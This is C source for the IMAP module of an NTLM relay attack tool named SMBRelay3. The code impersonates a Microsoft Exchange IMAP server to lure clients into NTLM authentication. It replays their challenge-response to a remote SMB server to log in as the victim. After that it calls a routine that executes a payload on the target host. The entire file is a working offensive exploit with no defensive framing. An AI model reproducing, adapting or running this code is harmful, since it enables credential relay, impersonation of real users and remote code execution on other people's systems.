/*
    SMBRelay3 - IMAP REPLAY ATTACK MODULE
    -------------------------------------


*/


#include "imaprelay.h"
#include "payload.h"

extern int verbose;

int HandleIncommingIMAPRequest(RELAY *relay, char *destinationhostname, int destinationport)
{
	char buffer[4096];
	char buf[4096];
	char buf1[4096];
	char buf2[4096];

	char CurrentUserName[256];
	char CurrentDomain[256];
	char CurrentWorkstation[256];
	smheader *SmbPacket1, *SmbPacket2, *SmbPacket3, *NegotiateProtocol;
    tSmbNtlmAuthRequest *request;
	
	uint16 packetlen;
	int i;
    char *p;
    char opt[5];
	const char WelcomeMessage[]= "* OK Microsoft Exchange Server 2007 IMAP4 service ready\r\n";

   // #define ERROR "-ERR The specified authentication package is not supported.\r\n"
    //#define CAPA "* CAPABILITY IMAP4 IMAP4rev1 IDLE LITERAL+ AUTH=NTLM\r\n0000 OK CAPABILITY completed.\r\n"

    
    //#define AUTH "+OK The operation completed successfully.\r\nNTLM\r\n.\r\n"
    #define AUTHOK "0001 OK AUTHENTICATE NTLM completed.\r\n"
    #define AUTHERROR "0001 ERROR AUTHENTICATE NTLM Failed.\r\n"
    

    printf("[+] Sending IMAP Banner\n");
    i=SendBytesAndWaitForResponse(relay->source,(char*)WelcomeMessage, (int)strlen(WelcomeMessage), buffer,sizeof(buffer),SMBWAITTIMEOUT);
	if (i<=0){
		printf("Error Reading IMAP Client message\n");
        return(0);
	}
    
    if (memcmp(buffer+4," CAPABILITY",11)==0) {
		printf("[+] CAPABILITY Request from client\n");
        memcpy(opt,buffer,4); opt[4]='\0';
        sprintf(buffer,"* CAPABILITY IMAP4 IMAP4rev1 IDLE LITERAL+ AUTH=NTLM\r\n%s OK CAPABILITY completed.\r\n",opt);
        i=SendBytesAndWaitForResponse(relay->source,buffer, strlen(buffer), buffer,sizeof(buffer),SMBWAITTIMEOUT);
        if (i<=0) return(0);
        buffer[i]='\0';
	}


    if (memcmp(buffer+4," AUTHENTICATE NTLM",18)!=0) {
        printf("[-] Not supported option %s received\n",buffer);
        i=SendBytesAndWaitForResponse(relay->source,(char*)AUTHERROR, strlen(AUTHERROR), buffer,sizeof(buffer),SMBWAITTIMEOUT);
        return(0);
    }
    if (strlen(buffer)>24){
        printf("[+] received AUTH NTLM message\n");
        memset((char*)&buf1,'\0',sizeof(buf1));
	    packetlen=from64tobits(buf1, buffer+22);
        request=(tSmbNtlmAuthRequest *)buf1;
        dumpAuthRequest(0,request);
    } else {
        memset(buffer,'\0',sizeof(buffer));
        i=SendBytesAndWaitForResponse(relay->source,"+\r\n", 3, buffer,sizeof(buffer),SMBWAITTIMEOUT);
        if (i<=0){
		    printf("[-] Error Auth response with NTLM type1 packet\n");
            return(0);
	    }
        buffer[i]='\0';
        printf("[+] received AUTH NTLM message\n");
        memset((char*)&buf1,'\0',sizeof(buf1));
	    packetlen=from64tobits(buf1, buffer);        
        request=(tSmbNtlmAuthRequest *)buf1;
        
        if (debug) {
            printf("[+] received AUTH NTLM message: %s\n",buffer);
            DumpMem(buf1,packetlen);
            dumpAuthRequest(0,request);
        }
    }
    

	//Init Replay Attack
    i=ConnectToRemoteHost(relay,destinationhostname,destinationport);
	if (!i) {
		printf("[-] Unable to connect to remote host %s:%i\n",destinationhostname,destinationport); 
		return(0);
	}
	printf("[+] Sending SMB Protocol Authentication Handshake\n");
    p = AddDialect(NULL,"PC NETWORK PROGRAM 1.0",0x02, &i);
    p = AddDialect(p,"LANMAN1.0", 0x02,&i);
    p = AddDialect(p,"Windows for Workgroups 3.1a", 0x02,&i);
    p = AddDialect(p,"LM1.2X002", 0x02,&i);
    p = AddDialect(p,"LANMAN2.1", 0x02,&i);
    p = AddDialect(p,"NT LM 0.12", 0x02,&i);
	NegotiateProtocol=BuildSmbPacket(NULL,NEGOTIATEPROTOCOLREQUEST,0,p,i);
    free(p);
    i=SendBytesAndWaitForResponse(relay->destination,(char*)NegotiateProtocol,SmbPacketLen(NegotiateProtocol),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
    free(NegotiateProtocol);
	if (i<=0){
		printf("[-] Initial SMBHandShake (LanManager Negotiation) Failed\n");
        return(0);
	}
	
	SmbPacket1=BuildSmbPacket1();
	if (debug)  {
		printf("\n[+] Dumping SMB Packet With NTLM Message Type 1\n");
		DumpMem((char*)SmbPacket1,SmbPacketLen(SmbPacket1));
	}

	SmbPacket2=GetSmbPacket2(relay,SmbPacket1);
	if  (SmbPacket2==NULL) {
		printf("[-] Unable to receive SMB Packet with NTLM Message Type 2\n");
        return(0);
	}
	printf("[+] Received SMB Message with NTLM message type 2 packet\n");
	memcpy((char*)&packetlen,GetNTLMPacketFromSmbPacket(SmbPacket2)-4,2);

    if (debug) {
        printf("[*] SMB Packet Dump:\n");
        DumpMem((char*)SmbPacket2,SmbPacketLen(SmbPacket2));
        printf("[*] NTLM Challenge packet from SMB message\n");
        DumpMem((char*)GetNTLMPacketFromSmbPacket(SmbPacket2),packetlen);
        dumpAuthChallenge(0,(tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2));
    }
		
    ((tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2))->flags=0xb207;
	memset(buf1,'\0',sizeof(buf1));
	to64frombits((unsigned char*)&buf1, (unsigned char*)GetNTLMPacketFromSmbPacket(SmbPacket2), packetlen);
	sprintf(buf,"+ %s\r\n",buf1);

	printf("[+] Replaying NTLM Challenge from SMB Server to the IMAP Client\n");
	if (debug)
	{
		printf("[+] Sending SMTP Response: %s\n",buf);
	}   
    i=SendBytesAndWaitForResponse(relay->source,(char*)buf,(int)strlen(buf),(char*)buffer,sizeof(buffer),SMBWAITTIMEOUT);
	if (i<=0)
	{
		printf("[-] Unable to read NTLM packet 3 from IMAP client\n");
        return(0);
	}
    buffer[i]='\0';

    if (debug) printf("[*] Response: %s\n",buffer);
	memset((char*)buf1,'\0',sizeof(buf1));
	packetlen=from64tobits(buf1, buffer);
    if (debug) {
        
		    printf("[*] Raw authorization packet (len: %i)\n",packetlen);
		    DumpMem(buf1,packetlen);
            dumpAuthResponse(0,(tSmbNtlmAuthResponse*)buf1);	
	}

    
	GetNTLMPacketInfo((tSmbNtlmAuthResponse*)buf1,(char*)&CurrentUserName, (char*)&CurrentDomain, (char*)&CurrentWorkstation,verbose);
	printf("[+] Trying to authenticate to remote SMB as %s\n",CurrentUserName);
	buildAuthResponse((tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2),(tSmbNtlmAuthResponse*)buf2,0,CurrentUserName,NULL,NULL,CurrentWorkstation, (tSmbNtlmAuthResponse*)buf1);
    SmbPacket3=BuildSmbPacket((smheader*)SmbPacket2,SESSIONSETUPANDX,0,buf2,(int)SmbLength((tSmbNtlmAuthResponse *)buf2));
    

	printf("[+] Sending Final SMB Authentication packet with NTLM Message type 3\n");
	if (debug) 
	{
		DumpMem((char*)SmbPacket3, SmbPacketLen(SmbPacket3));
	}

    i=SendBytesAndWaitForResponse(relay->destination,(char*)SmbPacket3, SmbPacketLen(SmbPacket3),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	if (i<=0){
		printf("[-] Error reading Server Authentication Response\n");
        i=SendBytesAndWaitForResponse(relay->source,AUTHERROR, strlen(AUTHERROR), buffer,sizeof(buffer),SMBWAITTIMEOUT);
        return(0);
	}
	if (debug)  {
		printf("[*] SessionSetupAndX Completed - Dumping received packet\n");
		DumpMem(buf,i);
	}

	if (((smheader*)buf)->NtStatus!=0x00000000) {
		printf("[-] SessionSetupAndX Completed\n[-] Authentication against Remote Host Failed\n");
        i=SendBytesAndWaitForResponse(relay->source,AUTHOK, strlen(AUTHERROR), buffer,sizeof(buffer),SMBWAITTIMEOUT);
        return(0);
	}
    if ( ((SessionSetupAndXResponse*)((smheader*)buf)->buffer)->Action & 0x0001 )
    {
         printf("[-] Authentication against Remote Host Failed. (Connected as Guest)\n");
         i=SendBytesAndWaitForResponse(relay->source,AUTHERROR, strlen(AUTHERROR), buffer,sizeof(buffer),SMBWAITTIMEOUT);
         
        return(0);
    }
		
	//WriteDataToReportFile("log.txt", (tSmbNtlmAuthResponse*)buf1, destinationhostname,(unsigned char*)((tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2))->challengeData);
	
	printf("[+] SessionSetupAndX Completed \n");
	printf("[+] Authenticacion against %s Succeed with username %s\n",destinationhostname,CurrentUserName);
    i=SendBytesAndWaitForResponse(relay->source,AUTHOK, strlen(AUTHOK), buffer,sizeof(buffer),SMBWAITTIMEOUT);
	ExecuteCode( *relay);

    return(1);

}
